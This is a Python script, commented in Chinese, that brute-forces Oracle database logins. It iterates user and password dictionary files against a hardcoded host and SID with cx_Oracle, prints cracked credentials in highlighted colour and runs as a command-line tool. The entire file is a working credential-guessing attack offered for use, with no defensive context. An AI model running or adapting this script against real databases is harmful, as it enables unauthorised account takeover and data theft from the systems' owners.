# -*-coding:utf-8 -*-
"""
Oracle爆破脚本
用法：
参数-u [用户字典] -p [密码字典]
破解成功的密码亮色输出
"""
import optparse
import threading
import cx_Oracle as cx

def Blast(user_dics, pwd_dics):#爆破
    dsn = cx.makedsn('10.10.40.63', '1521', sid='xe')  # ip,端口,database
    success = False
    users_f = open(user_dics, 'r')
    pwds_f = open(pwd_dics, 'r')
    for user in users_f.readlines():
        pwds_f.seek(0)
        for password in pwds_f.readlines():
            username = user.strip('\n')
            password = password.strip('\n')
            try:
                db = cx.connect(username, password, dsn)
                success = True
                if success:
                    print("\033[1;35;46m 用户名:" + username + " 密码:" + password + " 破解成功 \033[0m")
            except Exception as  e:
                print("用户名:" + username + " 密码:" + password + " 破解失败")
                pass
def main():
    print("Welcome to OracleCrack")
    print("Version:1.0")
    parser = optparse.OptionParser('usage%prog -u <users dictionary> -p <password dictionary>')
    parser.add_option('-u', dest='user_dic', type='string', help='specify the dictionary for user')
    parser.add_option('-p', dest='pwd_dic', type='string', help='specify the dictionary for passwords')
    (options, args) = parser.parse_args()
    user_dic = options.user_dic
    pwd_dic = options.pwd_dic
    #brute_force(user_dic, pwd_dic)
    t = threading.Thread(target=Blast, args=(user_dic, pwd_dic))
    t.start()

if __name__ == '__main__':
    main()




